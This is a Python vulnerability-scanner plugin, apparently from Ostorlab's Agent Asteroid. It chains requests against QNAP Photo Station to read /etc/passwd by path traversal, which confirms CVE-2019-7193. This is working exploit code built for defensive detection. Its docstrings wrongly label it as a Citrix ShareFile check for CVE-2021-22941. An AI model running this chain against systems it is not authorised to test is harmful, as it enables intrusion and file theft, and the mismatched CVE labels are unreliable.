"""Agent Asteroid implementation for CVE-2021-22941"""
import re

import requests
from ostorlab.agent.kb import kb
from ostorlab.agent.mixins import agent_report_vulnerability_mixin
from requests import exceptions as requests_exceptions

from agent import definitions
from agent import exploits_registry

VULNERABILITY_TITLE = "This improper input validation vulnerability in QNAP QTS"
VULNERABILITY_REFERENCE = "CVE-2019-7193"
VULNERABILITY_DESCRIPTION = (
    "This improper input validation vulnerability allows remote attackers to inject arbitrary code to the system. "
    "To fix the vulnerability, QNAP recommend updating QTS to their latest versions."
)

DEFAULT_TIMEOUT = 90
HEADERS = {"User-Agent": "Gundy - QNAP RCE"}
TARGET_FILE = "./../../../../../etc/passwd"


@exploits_registry.register
class CVE20197193Exploit(definitions.Exploit):
    """
    CVE-2021-22941: Improper Access Control in Citrix ShareFile storage zones controller
    """

    def accept(self, target: definitions.Target) -> bool:
        target_uri = f"{target.scheme}://{target.host}:{target.port}"
        try:
            req = requests.get(
                target_uri + "/cgi-bin/", verify=False, timeout=DEFAULT_TIMEOUT
            )
        except requests_exceptions.RequestException:
            return False
        return req.status_code == 200

    def check(self, target: definitions.Target) -> list[definitions.Vulnerability]:
        target_uri = f"{target.scheme}://{target.host}:{target.port}"
        session = requests.Session()

        # Get album id
        req = session.post(
            target_uri + "/photo/p/api/album.php",
            data={"a": "setSlideshow", "f": "qsamplealbum"},
            headers=HEADERS,
            verify=False,
            timeout=DEFAULT_TIMEOUT,
        )
        if req.status_code != 200:
            return []
        album_match = re.search("(?<=<output>).*?(?=</output>)", req.text)
        if album_match is None:
            return []
        album_id = album_match.group()

        # Get access code
        req = session.get(
            target_uri + "/photo/slideshow.php?album=" + album_id,
            headers=HEADERS,
            verify=False,
            timeout=DEFAULT_TIMEOUT,
        )
        if req.status_code != 200:
            return []
        access_match = re.search("(?<=encodeURIComponent\\(').*?(?=')", req.text)
        if access_match is None:
            return []
        access_code = access_match.group()

        # Read local file
        post_data = {
            "album": album_id,
            "a": "caption",
            "ac": access_code,
            "f": "UMGObv",
            "filename": TARGET_FILE,
        }
        req = session.post(
            target_uri + "/photo/p/api/video.php",
            data=post_data,
            headers=HEADERS,
            verify=False,
            timeout=DEFAULT_TIMEOUT,
        )
        if b"/bin/sh" not in req.content:
            return []

        vulnerability = self._generate_vulnerability_object(target_uri)
        return [vulnerability]

    def _generate_vulnerability_object(
        self, target_uri: str
    ) -> definitions.Vulnerability:
        entry = kb.Entry(
            title=VULNERABILITY_TITLE,
            risk_rating="HIGH",
            short_description=VULNERABILITY_DESCRIPTION,
            description=VULNERABILITY_DESCRIPTION,
            references={
                "nvd.nist.gov": f"https://nvd.nist.gov/vuln/detail/{VULNERABILITY_REFERENCE}"
            },
            recommendation=(
                "- Make sure to install the latest security patches from software vendor \n"
                "- Update to the latest software version"
            ),
            security_issue=True,
            privacy_issue=False,
            has_public_exploit=False,
            targeted_by_malware=False,
            targeted_by_ransomware=False,
            targeted_by_nation_state=False,
        )
        technical_detail = (
            f"{target_uri} is vulnerable to {VULNERABILITY_REFERENCE}, "
            f"{VULNERABILITY_TITLE}"
        )
        vulnerability = definitions.Vulnerability(
            entry=entry,
            technical_detail=technical_detail,
            risk_rating=agent_report_vulnerability_mixin.RiskRating.HIGH,
        )
        return vulnerability
